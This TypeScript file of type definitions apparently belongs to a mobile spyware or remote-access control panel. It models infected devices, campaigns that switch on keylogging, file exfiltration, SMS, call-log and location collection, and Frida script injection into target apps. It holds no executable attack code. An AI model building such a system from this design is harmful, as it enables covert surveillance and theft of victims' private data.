export interface Device {
    name: string;
    guid: string;
    status: 'active' | 'inactive' | 'connecting' | 'error';
    hasNotification: boolean;
    ip: string;
    os: string;
    connectionType: string;
    lastSeen: string;
    batteryLevel?: number;
    storageUsed?: number;
    storageTotal?: number;
    networkType?: string;
    location?: Location;
    capabilities?: string[];
    campaign?: string;
}

export interface Call {
    id: string;
    name: string | null;
    number: string;
    type: 'Outgoing' | 'Incoming' | 'Missed';
    date: string;
    duration: string;
    timestamp: number;
}

export interface Sms {
    id: string;
    from: string;
    to: string;
    message: string;
    date: string;
    timestamp: number;
    type: 'sent' | 'received';
}

export interface Location {
    latitude: number;
    longitude: number;
    accuracy?: number;
    timestamp: number;
    address?: string;
}

export interface FileSystemItem {
    name: string;
    path: string;
    type: 'file' | 'directory';
    size?: number;
    modified: string;
    permissions?: string;
    isHidden?: boolean;
}

export interface Campaign {
    id: string;
    name: string;
    description: string;
    createdAt: string;
    status: 'active' | 'paused' | 'completed';
    devices: string[];
    settings: CampaignSettings;
}

export interface CampaignSettings {
    autoScreenshots: boolean;
    locationTracking: boolean;
    callLogCollection: boolean;
    smsCollection: boolean;
    fileExfiltration: boolean;
    keylogger: boolean;
    screenshotInterval: number;
    locationInterval: number;
}

export interface Command {
    id: string;
    deviceId: string;
    command: string;
    timestamp: number;
    status: 'pending' | 'executing' | 'completed' | 'failed';
    result?: string;
    error?: string;
}

export interface WebSocketMessage {
    type: 'device_status' | 'command_result' | 'new_data' | 'error';
    deviceId?: string;
    data: any;
    timestamp: number;
}

export interface AuthUser {
    id: string;
    username: string;
    role: 'admin' | 'operator' | 'viewer';
    permissions: string[];
    lastLogin?: string;
}

export interface ApiResponse<T> {
    success: boolean;
    data?: T;
    error?: string;
    message?: string;
}

export interface DeviceStats {
    totalDevices: number;
    activeDevices: number;
    inactiveDevices: number;
    totalCommands: number;
    pendingCommands: number;
    dataCollected: {
        calls: number;
        sms: number;
        locations: number;
        files: number;
    };
}

export interface TimelineEvent {
    id: string;
    deviceId: string;
    type: 'command' | 'data_collection' | 'system_event' | 'user_action';
    title: string;
    description: string;
    timestamp: number;
    metadata?: Record<string, any>;
}

// Frida-specific types
export interface FridaSession {
    id: string;
    deviceId: string;
    targetPackage: string;
    created: string;
    status: 'active' | 'inactive' | 'error';
    attached: boolean;
    scripts: FridaScript[];
}

export interface FridaScript {
    id: string;
    name: string;
    type: 'predefined' | 'custom';
    description: string;
    content: string;
    status: 'loaded' | 'running' | 'stopped' | 'error';
    injected: boolean;
    targetPackage?: string;
    lastExecuted?: string;
    output?: string[];
}

export interface FridaServerStatus {
    deviceId: string;
    running: boolean;
    version: string;
    port: number;
    activeSessions: number;
    architecture: string;
    uptime: number;
    lastPing: string;
}

export interface FridaProcess {
    pid: number;
    name: string;
    package?: string;
    user?: string;
    arch?: string;
}

export interface FridaHook {
    id: string;
    sessionId: string;
    className: string;
    methodName: string;
    hookType: 'before' | 'after' | 'replace';
    active: boolean;
    hitCount: number;
    lastHit?: string;
    script: string;
}

export interface FridaCommand {
    id: string;
    sessionId: string;
    action: 'create_session' | 'execute_script' | 'inject_script' | 'hook_function' | 'call_function' | 'list_processes' | 'attach_process' | 'detach_process';
    parameters: Record<string, any>;
    timestamp: number;
    status: 'pending' | 'executing' | 'completed' | 'failed';
    result?: any;
    error?: string;
}
